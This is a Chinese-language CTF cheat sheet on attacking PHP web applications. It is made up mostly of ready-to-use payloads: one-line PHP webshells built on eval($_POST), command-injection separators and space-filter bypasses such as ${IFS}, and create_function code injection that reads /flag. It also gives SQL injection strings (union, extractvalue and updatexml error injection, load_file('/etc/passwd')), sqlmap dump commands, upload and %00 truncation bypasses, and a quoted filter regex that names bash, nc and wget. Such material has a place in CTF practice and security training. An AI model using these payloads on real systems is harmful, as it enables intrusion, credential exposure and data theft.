







## 一句话木马

```nginx
# script标签要求php版本在7.0以下
<script language='php'>eval($_POST['cmd']);</script>
<script language='php'>system('cat /flag');</script>
<?php @eval($_POST['shell']);?>

# 短标签写法
<?=@eval($_POST['shell']);?>
<?=$_GET['cmd']; ?>

# 这个<?= ?>相当于<?echo ?>
短标签<? ?>需要php.ini开启short_open_tag = On，但<?= ?>不受该条控制

filename="<?=$_GET['cmd']; eval($_POST['cmd']); ?>"

# 取反木马构造：
urlencode(~'assert');
urlencode(~'(eval($_POST[mochu]))')
```



## php特性利用

-   **php在解析字符串时会把点和空格解析成 `_`** 
-   **常见的可执行文件的后缀**
    -   **PHP: php2、php3、php5、phtml、pht**
    -   ASP: aspx、ascx、ashx、cer、asa
    -   JSP: jspx

-   **使用【``】符号PHP会尝试将反引号中的内容作为shell命令来执行**
    -   **使用【\t】绕过空格检查**
    -   **使用【%09】也可以代替空格**




### 双美元符：`$$`

```nginx
双美元符号：`$$`
# 案例
$name = "value";
$value = 100;
$$name = 200; # 创建一个名为 $value 的变量，并将其值设置为 200,（间接引用另一个变量）
echo $value; # 输出 200

结论：
	使用一个变量的值作为另一个变量的名称，
利用点：间接修改或获取目标参数的值
```

### 内置属性：`$_SERVER`

**介绍及案例**

```nginx
$_SERVER：是PHP预定义的超全局变量，
是一个包含了头信息(header)、路径(path)、以及脚本位置(script locations)等信息的数组

$_SERVER[‘PHP_SELF’]、$_SERVER[‘SCRIPT_NAME’] 与 $_SERVER[‘REQUEST_URI’]的差别

# 案例网址：https://www.shawroot.cc/php/index.php/test/foo?username=root
$_SERVER['PHP_SELF'] 	得到：/php/index.php/test/foo
$_SERVER['SCRIPT_NAME'] 得到：/php/index.php
$_SERVER['REQUEST_URI'] 得到：/php/index.php/test/foo?username=root

# 获取用户的IP地址
$_SERVER["REMOTE_ADDR"] => "127.0.0.1"，
```

**特性：**

```nginx
$_SERVER['QUERY_STRING']	不会进行urldecode，$_GET[]会
```

****

## php方法及部分绕过方法



#### eval()

-   **—把字符串作为PHP代码执行**

```nginx
# 例： 
eval("#".$_GET['cmd']); => cmd = %0a system('cat /flag')
# 只需要利用%0a作为换行符即可绕过，这是因为"#"只是单行注释。
```

#### shell_exec()

-   **通过shell环境执行命令,并且将完整的输出以字符串的方式返回**

```nginx
# 绕过空格
1. ${IFS}绕过空格
	# 原理：它是shell的特殊环境变量,是Linux下的内部区域分隔符
2. $IFS$9绕过也可以达到绕过空格的效果，要大写
3. %09是制表符通过Url编码后显示的样子，它也可以绕过空格
	
# 以下在linux中可执行，实战看情况
	{ }绕过，如：{cat,/f*}
	<绕过，cat</f*
```



#### file_get_contents()

-   **将整个文件读入一个字符串**

```nginx
# 绕过：
	if (file_get_contents($file) !== 'debu_debu_aqua')
	# 可以使用data伪协议绕过：data://text/plain,debu_debu_aqua

# 其他利用案例
    # 获取文件列表中的文件,文件名使用ASCII码拼接而成
    file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))
```

​    

#### sha1()

-   **计算字符串的 sha1 散列值**

```php
# 使用例子
if (sha1('apple') === 'd0be2dc421be4fcd0172e5afceea3970e2f3d940') {}
if (sha1($shana) === sha1($passwd) && $shana != $passwd ){}

# 绕过例子（post传入参数）：
$shana[]=1&$passwd[]=2
# 绕过原理：
sha1()函数无法处理数组，$shana和$passwd都是数组时，都是false	
```

****

#### preg_match()

-   **执行匹配正则表达式,**

```nginx
# 绕过方法：
1、它会努力去匹配第一行，可以利用多行的方法【%0A】截断，也可以使用【%00】截断
    但受限以下两种情况下可以使用【%00】截断
    magic_quotes_gpc=off
    php<5.3.4

2、可以利用空字符串绕过正则
3、也可以利用回溯绕过
# 案例：
	preg_match('/^dsf$/') 可以加上换行符%0a截断绕过(ds%0af)，因为这个正则是需要固定出现
```

****

#### basename()

-   **返回路径中的文件名部分**

```nginx
# 正常使用
<?php
    $path = "/testweb/home.php";
    //显示带有文件扩展名的文件名
    echo basename($path);
    //显示不带有文件扩展名的文件名
    echo basename($path,".php");
?> 

# 绕过原理：
	在使用默认语言环境设置时，basename() 会删除文件名开头的非 ASCII 字符

# 如测试代码：
<?php
    $file = $_GET['file'];
    echo basename($file);
    传入值分别为：
    http://localhost/?file=%ffindex.php/%ff  ==  # index.php
    http://localhost/?file=%ffindex.php		== #index.php
    http://localhost/?file=index.php%ff		== #index.php
    http://localhost/?file=index.php/%2b	== #+

# 结论
其中：ascii值为47、128-255的字符均可以绕过basename()、
其中47对应的符号为'/'，在实际场景中没有利用价值
同时中文字符也可以绕过basement()

```

****

#### create_function

-   **通过执行代码字符串创建动态函数**

```php
/**
    如果【_】被过滤可以使用：命名空间【\】绕过，只需要再函数名
	获取flag的方式使用：get_defined_vars()，获取到上下文所有的参数值
	代码注入时选择得注释符号可以是#，也可以是\\，但是#需要编码，即%23
	*/

# 正常使用案例：
<?php
    $new = create_function('$a,$b','return $a * $b;');
    echo $new(1,2);
?>
    // 等价以下
    <?php
        function lambda1('$a,$b'){
    		return $a * $b;	
		}
	?>

# 实际ctf案例：
    $a = $_GET['a'];
    $b = $_GET['b'];
	# 第一个字符不能是字母
    if(preg_match('/^[a-z0-9_]*$/isD',$a)){
        show_source(__FILE__);
    }
    else{
        $a('',$b);		// 从这里构成create_function
    }

#创建绕过方式案例：
    #  	var_dump()：打印变量的相关信息，可执行函数
    # 	scandir()：列出指定路径中的文件和目录
	a=\create_function&b=return 'mmkjhhsd';}var_dump(scandir('/'));/*
	
	发现根目录下有一个flag文件
	a=\create_function&b=return 'mmkjhhsd';}var_dump(file_get_contents('/flag'));/*

```

****

#### 随机数

-   **mt_srand()：给随机数发生器播种**
-   **mt_rand()：生成随机数**

```nginx
# 特性
mt_rand()产生随机数时，如果用srand(seed)播下种子之后，一旦种子相同，产生的随机数将是相同的

# 实际遇到解题方法：
	使用工具php_mt_seed
	获取获取mt_srand()的一个随机数
	然后使用php_mt_seed去跑出结果，./php_mt_seed 随机数
	第一个就是，然后在PHP环境中测试输出种子的下一个随机数
```

#### is_numeric()

-   **检测变量是否为数字或数字字符串**

```nginx
会判断如果是数字和数字字符串则返回 TRUE，否则返回 FALSE,

且php中弱类型比较时，会使('1234a' == 1234)为真，或者'12345%00'，

# 该函数还可能造成sql注入，例如
将'1 or 1'转换为16进制形式，再传参，就可以造成sql注入
```

#### addslashes()

-   **在特殊字符前添加\ **

```nginx
# 特性：
产生的【\】不会进入数据库，
可以使用urlencode进入绕过，# 条件：urldecode($username);
同理base64也可以进行牢固		# 条件 base64_decode($username);
宽字节注入也可以绕过，核心是一个字符串采用不同的编码方式
# 即'1过滤后变成\'1，进入库中却仍为'1，我们在取出数据后进行二次拼接，即可造成注入

```

#### strcmp()

```nginx
# 绕过
在参数名称上加个中括号
```



#### putenv()

-   **设置环境变量的值(只能用绝对路径来调用系统命令)**

```nginx
# 案例
putenv("DB_HOST=localhost");
putenv("DB_USER=root");
putenv("DB_PASSWORD=secret");

Linux命令的位置：
/bin,/usr/bin，默认都是全体用户使用，
/sbin,/usr/sbin,默认root用户使用
```

#### exif_imagetype()

-   **判断一个图像的类型，常用与文件上传**

```nginx
# 绕过方法：在文件头添加图片头就可以绕过
JPG ：FF D8 FF E0 00 10 4A 46 49 46
GIF(相当于文本的GIF89a)：47 49 46 38 39 61
PNG： 89 50 4E 47

# 白名单绕过(%00)
当网站上传XXX.php%00.jpg时，遇到%00字符就会截断后面的.jpg,
文件最终保存为XXX.php

# “\x00\x00\x8a\x39\x8a\x39”
```

​    

## 常见漏洞

### 命令执行

>   前提条件：**默认php.ini配置文件中是不禁止你调用执行外部命令的函数的，需要通过disable_functions修改**

>   php 4种**执行系统外部命令函数**：exec()、passthru()、system()、 shell_exec()

>   passthru与system的区别，passthru直**接将结果输出到浏览器，**
>
>   **不需要使用 echo 或 return 来查看结果，不返回任何值**，且其可以输出二进制，比如图像数据

>   system和exec的区别在于system在执行系统外部命令时，**直接将结果输出到浏览器**，
>
>   **不需要使用 echo 或 return 来查看结果**，如果执行命令成功则返回true，否则返回false。
>
>   第二个参数与exec第三个参数含义一样

### 代码注入

### 文件包含

### 文件上传

### SQL注入

#### sql中可利用的内置函数

```sql
-- 读取本地文件
-- '/etc/passwd [ 查看数据库中所有用户目录]
select load_file('/etc/passwd')

-- 读取隐藏的文件:.bash_history，记录着用户命令记录
select load_file('/home/www/.bash_history')

-- 以16进制输出文件内容
select hex(load_file('/tmp/html/.DS_Store'))

```



#### **常用的sql注入playload案例**

```sql
order by 2
/**/order/**/by/**/2

union select 1,database();#
/**/union/**/select/**/1,database();#

# ----------查库名---------
union select 1,group_concat(schema_name) from information_schema.schemata;
/**/union/**/select/**/1,group_concat(schema_name)/**/from/**/information_schema.schemata

# ----------查表名---------
union select 1,group_concat(table_name) from information_schema.tables where table_schema=database();#
/**/union/**/select/**/1,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database();#


# ----------查字段名---------
union select 1,group_concat(table_name) from information_schema.columns where table_schema=database() and table_name='';#
# 或者
select 1, group_concat(column_name),3 from information_schema.columns where table_name='表名'#

/**/union/**/select/**/1,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema='alien_code'/**/and/**/table_name='code';#

# ----------查表中所有数据---------
select 1, group_concat(字段名 separator '-'),group_concat(字段名 separator '-') from 表名

# ----------字符串截取---------
substr(flag,1,20)
mid(flag,1,15);
```

#### 报错注入

```sql
admin'^extractvalue(1,concat(0x5c,(select(database()))))%23

```

##### 单引号报错注入

-   **对数据库中的xml文档故意报错，利用【0x7e = ~ 】这种方式，对后台进行一个排序，指定一个参数为null，让它故意报错，将第二个参数中的语句带入数据库执行，最后报错显示执行结果**

```sql
-- MySQL 5.1.5版本以上才支持该函数
^extractvalue(1,concat(0x5c,(select(database()))))%23
and (extractvalue(1,concat(0x7e,(select(user())),0x7e))%23)

# 模版
and extractvalue(1,concat(0x7e,(select 1,group_concat(table_name) from information_schema.tables where table_schema=database())))#
and extractvalue(1,concat(0x7e,(select 1,group_concat(table_name) from information_schema.columns where table_schema=database() and table_name='')))#
```

-   **updatexml**

```nginx
(updatexml(1,concat(0x7e,data(),0x7e),1))#
and updatexml(1,concat(0x7e,(version())),0) --+
and updatexml(1,concat(0x7e,(version())),0) #

and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),0)#
and updatexml(1,concat(0x7e,(select 1,group_concat(table_name) from information_schema.columns where table_schema=database() and table_name='')),0)#
```



#### sqlmap注入命令

```nginx
sqlmap -u “注入地址” -v 1 –-dbs # 列举数据库
sqlmap -u “注入地址” -v 1 –-current-db # 当前数据库
sqlmap -u “注入地址” -v 1 –-users # 列数据库用户
sqlmap -u “注入地址” -v 1 -D “数据库” –-tables # 列举数据库的表名
sqlmap.py -u “注入地址” -v 1 -T “表名” -D “数据库” –-columns # 获取表的列名
sqlmap.py -u “注入地址” -v 1 -T “表名” -D “数据库” -C “字段” –-dump # 获取表中的数据

```



### XSS

### SSRF

### CSRF

### XXE

### 反序列化

-   **当序列化后对象的参数列表中成员个数和实际个数不符合时会绕过 __weakup()函数**

### 其他



## 代码审计

### **cms审计**

**i春秋qqcms**

```nginx
主要是根据项目中自定义的模板规则进行注入
```



## 一些绕过

-   绕过`shell_exec()`函数的特性

-   shell_exec() 函数实际上仅是反撇号 【`】 操作符的变体

-   ```nginx
    //命令执行的输出。 如果执行过程中发生错误或者进程不产生输出，则返回 NULL。
    $resultData = shell_exec($command);
    ```

-   用于尝试代表题目：[GXYCTF 2019]Ping Ping Ping

    -   linux下

        -   ```bash
            # 空格过滤
            ${IFS}	代替空格
            $IFS$9	代替空格
            $IFS$1	代替空格
            常见的绕过符号有：
            $IFS$9 、${IFS} 、%09(php环境下)、 重定向符<>、<、
            
            # $IFS在linux下表示分隔符，如果不加{}则bash会将IFS解释为一个变量名，加一个{}就固定了变量名，
            # $IFS$9后面之所以加个$是为了起到截断的作用
            ```

        -   内联执行

            -   ```nginx
                在linux系统中，反引号是作为内联执行，输出查询结果的内容。
                比如:
                	用ls查询出index.php。那么`ls`就代表了index.php这个文件,如果存在多个文件那么就代表这多个文件，使用cat命令去读，会读所有的文件
                ls
                cat `ls`
                ```

        -   base64编码绕过

        -   设置变量名

        -   单双引号绕过

-   `exec()`函数特性（一般考察无回显 RCE）

-   **exec 执行系统外部命令时不会输出结果，而是返回结果的最后一行**

    -   ```nginx
        # 不直接输入结果内容，命令执行结果的最后一行内容，
        # 第二个参数可获取到所有返回结果，每行结果作为一个数组记录，
        # 第三个参数返回命令执行的状态码，0代表成功1失败
        $resultData =exec($command,$output,$returnVal);
        	一般执行是没有回显的，但是可以搭配tee命令使用
        tee命令：
        	是将想要执行的命令写入到一个文件中，然后再去访问这个文件就会执行写入的命令
        	如输入命令：ls /|tee 1.txt
        	然后再通过：http://url/1.txt 就会返回执行ls / 的结果
        ```

    -   ```nginx
        利用绕过：
        如存在以下过滤：
        if(preg_match('/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\-|\*|\"|\>|\<|\%|\$/i',$url))
            {}
        通过过滤会执行：exec($url);
        	绕过方法：
        		没有过滤掉 \ ,所有可以通过添加\突破限制
        		由于没有回显所有可以考虑配合linux中的tee命令将命令写入文件在访问获取
        ```

        

#### 1、ping命令相关的命令执行

**正常情况有五种写法**

```bash
127.0.0.1&&+code	# 左边命令的值为真执行左边，否则执行右边
127.0.0.1&+code		# &表示将任务置于后台执行
127.0.0.1||+code	# 左边的命令返回假才执行右边的
127.0.0.1|+code		# |表管道，上一条命令的输出，作为下一条命令的参数
127.0.0.1;+code		# 多行语句用换行区分代码块，单行语句用分号区分
	# 代表题目：[GXYCTF 2019]Ping Ping Ping
```

#### 2、无回显RCE

**做题思路**：

1.   利用dnslog带外
2.   写马
3.   反弹shell
4.   写文件然后访问文件